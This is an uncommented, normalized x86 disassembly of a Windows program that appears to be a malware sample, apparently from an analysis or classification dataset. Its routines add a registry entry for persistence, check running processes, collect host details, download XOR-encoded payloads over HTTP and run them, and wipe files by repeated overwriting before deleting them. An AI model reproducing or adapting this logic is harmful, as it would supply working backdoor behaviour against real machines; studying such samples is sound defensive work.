sub_401000
push ebp
mov ebp esp
sub esp 0x210
push esi
lea eax [ ebp - 0x10c ]
push 0x104
xor esi esi
push eax
push esi
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x10c ]
push 0x5c
push eax
call strrchr
inc eax
push eax
lea eax [ ebp - 0x210 ]
push rw-data
push eax
call sprintf
add esp 0x14
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0xf003f
push esi
push esi
push esi
push rw-data
push 0x80000001
call [ RegCreateKeyExA@IAT ]
cmp eax esi
jne r-xdata
xor eax eax
lea eax [ ebp - 0x10c ]
push edi
push eax
call strlen
pop ecx
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x1
lea eax [ ebp - 0x210 ]
push esi
push eax
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0x4 ]
mov edi eax
call [ RegCloseKey@IAT ]
cmp edi esi
pop edi
jne r-xdata
push 0x1
pop eax
jmp r-xdata
pop esi
leave
retn
sub_4010ab
push ebp
mov ebp esp
mov eax 0x1110
call sub_402080
push ebx
push esi
lea eax [ ebp - 0x8 ]
push edi
push eax
lea eax [ ebp - 0x1110 ]
push 0x1000
push eax
call EnumProcesses
test eax eax
je r-xdata
xor eax eax
mov esi [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x0
shr esi 0x2
je r-xdata
lea ebx [ ebp - 0x1110 ]
inc [ ebp - 0x4 ]
add ebx 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push 0x4
push eax
push edi
call EnumProcessModules
test eax eax
je r-xdata
push [ ebx ]
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov edi eax
test edi edi
je r-xdata
push edi
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x110 ]
push 0x104
push eax
push [ ebp - 0xc ]
push edi
call GetModuleBaseNameA
push [ ebp + 0x8 ]
call strlen
push eax
lea eax [ ebp - 0x110 ]
push [ ebp + 0x8 ]
push eax
call _strnicmp
add esp 0x10
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_401168
push ebp
mov ebp esp
sub esp 0x30
push esi
push edi
push 0x5
mov esi rw-data
pop ecx
lea edi [ ebp - 0x18 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0x5
mov esi rw-data
pop ecx
lea edi [ ebp - 0x30 ]
[ edi ] [ esi ]
lea eax [ ebp - 0x18 ]
push eax
movsw [ edi ] [ esi ]
call sub_4011cd
lea eax [ ebp - 0x30 ]
push eax
call sub_4011cd
lea eax [ ebp - 0x18 ]
push eax
call sub_4010ab
add esp 0xc
cmp eax 0x1
pop edi
pop esi
je r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x30 ]
push eax
call sub_4010ab
cmp eax 0x1
pop ecx
je r-xdata
call sub_401000
leave
retn
sub_4011cd
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_401b31
push esi
call strlen
pop ecx
pop ecx
and [ eax + esi + 0x1 ] 0x0
xor eax eax
pop esi
retn
test eax eax
jg r-xdata
dec eax
cmp [ eax + esi ] 0x20
jne r-xdata
sub_4011f4
push ebp
mov ebp esp
sub esp 0x290
push esi
lea eax [ ebp - 0x290 ]
push edi
push eax
push 0x202
call [ WSAStartup@IAT ]
mov eax [ ebp + 0x8 ]
push 0x100
and [ eax ] 0x0
lea eax [ ebp - 0x100 ]
push eax
call [ gethostname@IAT ]
lea eax [ ebp - 0x100 ]
push eax
call [ gethostbyname@IAT ]
mov edi eax
test edi edi
je r-xdata
call [ WSACleanup@IAT ]
pop edi
xor eax eax
pop esi
leave
retn
mov eax [ edi + 0xc ]
mov esi [ eax ]
test esi esi
je r-xdata
push ebx
xor ebx ebx
push rw-data
push [ ebp + 0x8 ]
call strcat
pop ecx
pop ecx
push [ esi ]
call [ inet_ntoa@IAT ]
push eax
push [ ebp + 0x8 ]
call strcat
push rw-data
push [ ebp + 0x8 ]
call strcat
mov eax [ edi + 0xc ]
add ebx 0x4
add esp 0x10
mov esi [ eax + ebx ]
test esi esi
jne r-xdata
pop ebx
sub_401292
sub esp 0x430
push ebx
push esi
push edi
mov esi rw-data
lea edi [ esp + 0x2c ]
xor ebx ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ rw-data ] ebx
mov [ esp + 0xc ] ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jne r-xdata
lea eax [ esp + 0x3c ]
push ebp
push eax
call sub_4011f4
mov [ esp ] rw-data
call atoi
mov [ esp + 0x1c ] eax
mov [ esp ] rw-data
call atoi
mov [ esp + 0x2c ] eax
mov [ esp ] rw-data
call atoi
pop ecx
mov [ esp + 0x24 ] eax
mov [ esp + 0x14 ] 0x1
xor eax eax
jmp r-xdata
xor ebp ebp
cmp [ esp + 0x18 ] ebx
jle r-xdata
mov [ esp + 0x14 ] 0x1
pop edi
pop esi
pop ebx
add esp 0x430
retn
cmp [ esp + 0x10 ] ebx
je r-xdata
cmp [ esp + 0x10 ] ebx
jne r-xdata
inc [ esp + 0x14 ]
xor ebx ebx
cmp [ esp + 0x10 ] ebx
je r-xdata
cmp [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] ebx
jle r-xdata
cmp [ esp + 0x14 ] 0x1
push 0x1
push 0x50
jne r-xdata
cmp [ esp + 0x14 ] 0x2
jle r-xdata
xor eax eax
pop ebp
test ebx ebx
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
lea eax [ esp + 0x30 ]
push eax
lea eax [ esp + 0x44 ]
push eax
call strstr
pop ecx
test eax eax
pop ecx
je r-xdata
xor ebx ebx
cmp edi ebx
je r-xdata
mov ebx rw-data
push ebx
push edi
call strstr
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push ebx
push rw-data
call sub_401708
add esp 0x14
cmp [ rw-data ] 0xc8
mov edi eax
jne r-xdata
cmp [ esp + 0x10 ] 0x1
push 0x1
push 0x50
jne r-xdata
cmp [ esp + 0x10 ] 0x1
push 0x1
push 0x50
jne r-xdata
cmp [ esp + 0x10 ] ebx
jne r-xdata
push edi
call free
pop ecx
push ebx
call strlen
add esi eax
pop ecx
xor eax eax
push rw-data
push rw-data
jmp r-xdata
push rw-data
push rw-data
jmp r-xdata
inc ebp
cmp ebp [ esp + 0x18 ]
jl r-xdata
mov eax [ esp + 0x28 ]
imul eax eax 0x3e8
push eax
call _sleep
pop ecx
cmp cl 0x2e
jne r-xdata
cmp cl 0x39
jle r-xdata
test esi esi
je r-xdata
mov ebp rw-data
push ebp
push esi
call strstr
mov edi eax
pop ecx
test edi edi
pop ecx
je r-xdata
push 0x0
push rw-data
call sub_401708
add esp 0x14
cmp [ rw-data ] 0xc8
mov esi eax
jne r-xdata
push 0x0
push rw-data
jmp r-xdata
and [ esp + eax + 0x30 ] 0x0
lea eax [ esp + 0x30 ]
push eax
call strlen
cmp eax 0x7
pop ecx
jb r-xdata
mov [ esp + eax + 0x30 ] cl
inc esi
inc eax
cmp eax 0xf
jl r-xdata
mov eax [ esp + 0x28 ]
imul eax eax 0x3e8
push eax
call _sleep
push esi
call free
pop ecx
cmp [ rw-data ] 0xc8
jne r-xdata
push ebp
call strlen
add edi eax
pop ecx
cmp [ edi ] 0x0
je r-xdata
lea eax [ esp + 0x30 ]
push eax
call strlen
cmp eax 0xf
pop ecx
ja r-xdata
mov cl [ esi ]
cmp cl 0x30
jl r-xdata
test esi esi
je r-xdata
push 0x1
test esi esi
pop ebx
je r-xdata
push 0x2
push rw-data
push edi
call strncmp
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov [ esp + 0x10 ] eax
inc [ esp + 0x1c ]
mov eax [ esp + 0x1c ]
cmp eax [ esp + 0x18 ]
jl r-xdata
push [ rw-data ]
push esi
call sub_401c1f
push 0x2
push rw-data
push esi
call strncmp
add esp 0x14
test eax eax
jne r-xdata
push esi
call free
jmp r-xdata
push 0x2
push rw-data
push edi
call strncmp
add esp 0xc
test eax eax
jne r-xdata
push 0x2
mov edi rw-data
pop ebx
push rw-data
push edi
call fopen
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
je r-xdata
pop ecx
lea eax [ edi + 0x2 ]
push rw-data
push eax
call strtok
push eax
call _strdup
mov ebp eax
add esp 0xc
test ebp ebp
je r-xdata
push esi
call free
push edi
call sub_401691
mov eax [ esp + 0x2c ]
imul eax eax 0x3e8
push eax
call _sleep
push edi
call sub_401c33
add esp 0x10
jmp r-xdata
push eax
push [ rw-data ]
push 0x1
push esi
call fwrite
push [ rw-data ]
call fclose
add esp 0x14
mov eax [ esp + 0x2c ]
lea edi [ eax + edi + 0x2 ]
test edi edi
je r-xdata
push ebp
call atoi
push ebp
mov [ esp + 0x28 ] eax
call strlen
inc eax
push ebp
mov [ esp + 0x38 ] eax
call free
add esp 0xc
push [ esp + 0x20 ]
push edi
call sub_401c1f
push 0x2
mov ebp rw-data
pop ebx
push rw-data
push ebp
call fopen
add esp 0x10
mov [ rw-data ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
push eax
push [ esp + 0x24 ]
push 0x1
push edi
call fwrite
push [ rw-data ]
call fclose
add esp 0x14
push ebp
call sub_401691
mov eax [ esp + 0x28 ]
imul eax eax 0x3e8
push eax
call _sleep
push ebp
call sub_401c33
add esp 0xc
jmp r-xdata
push esi
call free
pop ecx
sub_401691
push ebp
mov ebp esp
sub esp 0x54
push esi
push 0x44
pop eax
xor esi esi
mov [ ebp - 0x54 ] eax
push eax
lea eax [ ebp - 0x54 ]
push esi
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x81
mov [ ebp - 0x24 ] si
push eax
lea eax [ ebp - 0x54 ]
push eax
push esi
push esi
push 0x20
push esi
push esi
push esi
push [ ebp + 0x8 ]
push esi
call [ CreateProcessA@IAT ]
dec eax
pop esi
neg eax
sbb eax eax
leave
retn
sub_401708
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push 0x4
pop esi
push rw-data
mov [ ebp - 0x10 ] esi
call _strdup
pop ecx
xor ebx ebx
push ebx
push ebx
push ebx
push esi
push eax
mov [ rw-data ] eax
call [ InternetOpenA@IAT ]
cmp eax ebx
mov [ ebp - 0x8 ] eax
je r-xdata
xor eax eax
push ebx
push ebx
push 0x3
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call [ InternetConnectA@IAT ]
mov edi eax
cmp edi ebx
mov [ ebp + 0x14 ] edi
je r-xdata
push [ ebp - 0x8 ]
call [ InternetCloseHandle@IAT ]
mov eax ebx
jmp r-xdata
mov eax [ ebp + 0x18 ]
dec eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push ebx
push 0x4400100
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push rw-data
push edi
call [ HttpOpenRequestA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
dec eax
jne r-xdata
push [ ebp + 0x14 ]
call [ InternetCloseHandle@IAT ]
push ebx
push ebx
push ebx
push ebx
push eax
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
mov eax [ ebp - 0xc ]
cmp eax 0x197
je r-xdata
push ebx
push 0x4400100
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push rw-data
push edi
call [ HttpOpenRequestA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
je r-xdata
push 0x3e8
call _sleep
cmp esi ebx
pop ecx
je r-xdata
push 0x400
mov [ rw-data ] eax
call malloc
pop ecx
mov edi eax
xor esi esi
push [ ebp + 0xc ]
call strlen
pop ecx
push eax
push [ ebp + 0xc ]
push ebx
push ebx
push [ ebp + 0x8 ]
jmp r-xdata
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
call [ HttpSendRequestA@IAT ]
push ebx
push 0x7
push eax
push esi
call [ GetDesktopWindow@IAT ]
push eax
call [ InternetErrorDlg@IAT ]
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push edi
call esi
push [ ebp - 0x8 ]
call esi
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov [ rw-data ] ebx
jmp r-xdata
push edi
call free
pop ecx
mov [ esi + edi ] bl
mov [ rw-data ] esi
mov ebx edi
add esi [ ebp - 0x4 ]
lea eax [ esi + 0x400 ]
push eax
push edi
call realloc
pop ecx
mov edi eax
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
call [ InternetCloseHandle@IAT ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ esi + edi ]
push 0x3ff
push eax
push [ ebp + 0x8 ]
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
sub_4018c4
push ebp
mov ebp esp
sub esp 0x3c0
push ebx
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0x2bc ]
push 0xa
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x2b2 ]
push 0x8
[ edi ]
pop ecx
mov esi rw-data
lea edi [ ebp - 0x28a ]
push 0x9
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea edi [ ebp - 0x268 ]
mov esi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea edi [ ebp - 0x258 ]
pop edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx edx
xor eax eax
lea edi [ ebp - 0x24a ]
mov esi rw-data
[ edi ]
lea edi [ ebp - 0x226 ]
push 0xb
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop ecx
lea edi [ ebp - 0x223 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov esi rw-data
lea edi [ ebp - 0x1f4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx edx
xor eax eax
lea edi [ ebp - 0x1e7 ]
mov ebx rw-data
[ edi ]
stosb [ edi ]
mov esi ebx
lea edi [ ebp - 0x1c2 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx edx
xor eax eax
lea edi [ ebp - 0x1b7 ]
mov esi rw-data
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea edi [ ebp - 0x190 ]
mov ecx edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
lea edi [ ebp - 0x182 ]
[ edi ]
mov esi rw-data
lea edi [ ebp - 0x15e ]
push 0x8
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop ecx
lea edi [ ebp - 0x14c ]
[ edi ]
mov esi rw-data
lea edi [ ebp - 0x12c ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0xa
lea edi [ ebp - 0x125 ]
pop ecx
mov edx rw-data
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x8
mov esi edx
pop ecx
lea edi [ ebp - 0xfa ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor eax eax
lea edi [ ebp - 0xd7 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
mov esi rw-data
lea edi [ ebp - 0xc8 ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0xb
xor eax eax
pop ecx
lea edi [ ebp - 0xc2 ]
[ edi ]
push 0x8
mov esi edx
pop ecx
lea edi [ ebp - 0x96 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
lea edi [ ebp - 0x73 ]
mov esi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
lea edi [ ebp - 0x64 ]
push 0xa
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x5b ]
mov esi ebx
[ edi ]
stosb [ edi ]
lea edi [ ebp - 0x32 ]
push 0x9
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x27 ]
[ edi ]
stosw [ edi ]
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
stosb [ edi ]
push esi
call [ DoEnvironmentSubstA@IAT ]
cmp [ esi ] 0x25
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
xor ebx ebx
lea edi [ ebp - 0x2bc ]
mov eax ebx
imul eax eax 0x64
lea eax [ ebp + eax - 0x28a ]
push eax
lea eax [ ebp - 0x3c0 ]
push rw-data
push eax
call sprintf
push 0x25
push esi
call strrchr
inc eax
push eax
lea eax [ ebp - 0x3c0 ]
push eax
call strcat
add esp 0x1c
inc ebx
add edi 0x64
cmp ebx 0x7
jl r-xdata
lea eax [ ebp - 0x3c0 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x3c0 ]
push eax
push esi
call strncpy
lea eax [ ebp - 0x3c0 ]
push eax
call strlen
add esp 0x14
and [ eax + esi ] 0x0
lea eax [ ebp - 0x3c0 ]
push rw-data
push eax
call sprintf
push 0x25
push esi
call strrchr
inc eax
push eax
lea eax [ ebp - 0x3c0 ]
push eax
call strcat
add esp 0x18
push edi
call strlen
push eax
push edi
push esi
call strncmp
add esp 0x10
test eax eax
je r-xdata
jmp r-xdata
cmp ebx 0x7
jl r-xdata
sub_401b31
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call strlen
pop ecx
mov edi eax
xor ecx ecx
test edi edi
jle r-xdata
pop edi
xor eax eax
pop esi
retn
push ebx
mov edx eax
sub edx 0x20
je r-xdata
je r-xdata
test [ ecx + esi ] 0x20
je r-xdata
sub edx 0x20
je r-xdata
test [ ecx + esi ] 0x10
je r-xdata
mov edx eax
dec edx
je r-xdata
and bl 0xbf
or bl 0x40
jmp r-xdata
test [ ecx + esi ] 0x40
je r-xdata
sub edx 0x40
jne r-xdata
and bl 0xfd
jmp r-xdata
or bl 0x2
jmp r-xdata
test [ ecx + esi ] 0x1
je r-xdata
dec edx
je r-xdata
cmp eax 0x10
jg r-xdata
mov [ ecx + esi ] bl
inc ecx
cmp ecx edi
jl r-xdata
cdq
sub eax edx
sar eax 0x1
test eax eax
jg r-xdata
and bl 0xdf
jmp r-xdata
or bl 0x20
jmp r-xdata
test [ ecx + esi ] 0x80
je r-xdata
and bl 0xfe
jmp r-xdata
or bl 0x1
jmp r-xdata
test [ ecx + esi ] 0x2
je r-xdata
dec edx
dec edx
je r-xdata
xor bl bl
mov eax 0x80
pop ebx
and bl 0x7f
jmp r-xdata
or bl 0x80
jmp r-xdata
and bl 0xef
jmp r-xdata
or bl 0x10
jmp r-xdata
test [ ecx + esi ] 0x4
je r-xdata
sub edx 0x4
jne r-xdata
and bl 0xfb
jmp r-xdata
or bl 0x4
jmp r-xdata
test [ ecx + esi ] 0x8
je r-xdata
and bl 0xf7
jmp r-xdata
or bl 0x8
jmp r-xdata
sub_401c33
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push ebx
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
push 0x8
push 0x80
push ebx
call [ SetFileAttributesA@IAT ]
push rw-data
push ebx
call fopen
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push 0x7
jmp r-xdata
push [ esi + 0x10 ]
call _filelength
push esi
mov edi eax
call fclose
pop ecx
test edi edi
pop ecx
jle r-xdata
pop eax
push ebx
call [ DeleteFileA@IAT ]
neg eax
sbb eax eax
add eax 0x6
jmp r-xdata
push edi
call malloc
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x4
jmp r-xdata
mov esi rw-data
push esi
push [ ebp + 0x8 ]
call fopen
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
je r-xdata
push esi
push [ ebp + 0x8 ]
call fopen
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
je r-xdata
push edi
push 0xff
push ebx
call memset
push [ ebp - 0x4 ]
push edi
push 0x1
push ebx
call fwrite
push [ ebp - 0x4 ]
call fflush
push [ ebp - 0x4 ]
call fclose
add esp 0x24
mov [ ebp - 0x8 ] 0x1
push esi
push [ ebp + 0x8 ]
call fopen
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push edi
push 0x0
push ebx
call memset
push [ ebp - 0x4 ]
push edi
push 0x1
push ebx
call fwrite
push [ ebp - 0x4 ]
call fflush
push [ ebp - 0x4 ]
call fclose
add esp 0x24
mov [ ebp - 0x8 ] 0x1
push ebx
call free
cmp [ ebp - 0x8 ] 0x1
pop ecx
jne r-xdata
push edi
push 0x55
push ebx
call memset
push esi
push edi
push 0x1
pop edi
push edi
push ebx
call fwrite
push esi
call fflush
push esi
call fclose
add esp 0x24
mov [ ebp - 0x8 ] edi
push 0x3
jmp r-xdata
push [ ebp + 0x8 ]
call [ DeleteFileA@IAT ]
neg eax
sbb eax eax
inc eax
inc eax
jmp r-xdata
sub_401da3
push ebp
mov ebp esp
sub esp 0x184
push ebx
push esi
push edi
push 0x1
pop ebx
push ebx
call _sleep
pop ecx
call sub_401168
mov [ rw-data ] eax
call sub_4016da
test eax eax
je r-xdata
xor edi edi
push ebx
call _sleep
pop ecx
xor edi edi
push edi
push edi
push edi
call [ GetCurrentThreadId@IAT ]
push eax
call [ PostThreadMessageA@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] edi
mov esi rw-data
push ebx
push esi
call [ InitializeSecurityDescriptor@IAT ]
push edi
push edi
push ebx
push esi
call [ SetSecurityDescriptorDacl@IAT ]
mov [ rw-data ] esi
jmp r-xdata
push edi
push edi
lea eax [ ebp - 0x44 ]
push edi
push eax
call [ GetMessageA@IAT ]
jmp r-xdata
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x10
call esi
cmp eax 0x5
je r-xdata
push [ rw-data ]
mov esi rw-data
mov [ rw-data ] 0xc
mov [ rw-data ] ebx
push rw-data
push esi
call sprintf
add esp 0xc
push esi
push edi
push edi
call [ CreateMutexA@IAT ]
mov esi [ GetLastError@IAT ]
call esi
cmp eax 0xb7
je r-xdata
call sub_4016da
test eax eax
je r-xdata
mov esi rw-data
push esi
call sub_4011cd
push esi
call atoi
imul eax eax 0x3e8
push eax
call _sleep
push rw-data
call sub_4011cd
push rw-data
call sub_4011cd
push rw-data
call sub_4011cd
push rw-data
call sub_4011cd
push rw-data
call sub_4011cd
push rw-data
call sub_4011cd
push rw-data
call sub_4011cd
push rw-data
call sub_4011cd
push rw-data
call sub_4011cd
mov esi rw-data
push esi
call sub_4011cd
push esi
call strlen
push eax
push esi
mov esi rw-data
push esi
call strncpy
add esp 0x44
push 0x104
push esi
call sub_4018c4
mov edi rw-data
push edi
call sub_4011cd
push edi
mov edi rw-data
push esi
push edi
push rw-data
call sprintf
mov ebx rw-data
push ebx
call sub_4011cd
push ebx
push esi
mov ebx rw-data
push edi
push ebx
call sprintf
push ebx
call sub_401c33
mov ebx rw-data
push ebx
call sub_4011cd
push ebx
push esi
mov ebx rw-data
push edi
push ebx
call sprintf
add esp 0x48
push ebx
call sub_401c33
mov ebx rw-data
push ebx
call sub_4011cd
push ebx
push esi
push edi
mov edi rw-data
push edi
call sprintf
push edi
call sub_401c33
push esi
mov esi rw-data
push rw-data
push esi
call sprintf
add esp 0x28
push esi
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
call sub_401292
push 0x0
call exit
lea eax [ ebp - 0x10 ]
push eax
call [ GetLocalTime@IAT ]
push 0x1
call _sleep
pop ecx
lea eax [ ebp - 0x184 ]
push eax
push esi
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x180 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ FileTimeToSystemTime@IAT ]
movzx ecx [ ebp - 0x28 ]
movzx eax [ ebp - 0x10 ]
movzx edx [ ebp - 0xe ]
sub eax ecx
movzx ecx [ ebp - 0x26 ]
imul eax eax 0x16d
sub edx ecx
imul edx edx 0x1e
movzx ecx [ ebp - 0x22 ]
add eax edx
sub eax ecx
movzx ecx [ ebp - 0xa ]
add eax ecx
jmp r-xdata
push esi
call sub_401c33
pop ecx
and [ rw-data ] 0x0
jmp r-xdata
cmp eax 0xb4
jge r-xdata
sub_402080
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_402295
cmp [ rw-data ] ebx
jne r-xdata
call sub_402280
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_402292
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401da3
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401c1f
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test ecx ecx
jle r-xdata
retn
xor [ eax ] 0x55
inc eax
dec ecx
jne r-xdata
strlen
jmp [ strlen@IAT ]
sprintf
jmp [ sprintf@IAT ]
strrchr
jmp [ strrchr@IAT ]
_strnicmp
jmp [ _strnicmp@IAT ]
strcat
jmp [ strcat@IAT ]
fclose
jmp [ fclose@IAT ]
fwrite
jmp [ fwrite@IAT ]
fopen
jmp [ fopen@IAT ]
strtok
jmp [ strtok@IAT ]
strncmp
jmp [ strncmp@IAT ]
_sleep
jmp [ _sleep@IAT ]
free
jmp [ free@IAT ]
strstr
jmp [ strstr@IAT ]
atoi
jmp [ atoi@IAT ]
memset
jmp [ memset@IAT ]
realloc
jmp [ realloc@IAT ]
malloc
jmp [ malloc@IAT ]
strncpy
jmp [ strncpy@IAT ]
fflush
jmp [ fflush@IAT ]
_filelength
jmp [ _filelength@IAT ]
exit
jmp [ exit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_402280
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_402292
xor eax eax
retn
sub_402295
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
GetModuleBaseNameA
jmp [ GetModuleBaseNameA@IAT ]
EnumProcessModules
jmp [ EnumProcessModules@IAT ]
EnumProcesses
jmp [ EnumProcesses@IAT ]
_strdup
jmp [ _strdup@IAT ]
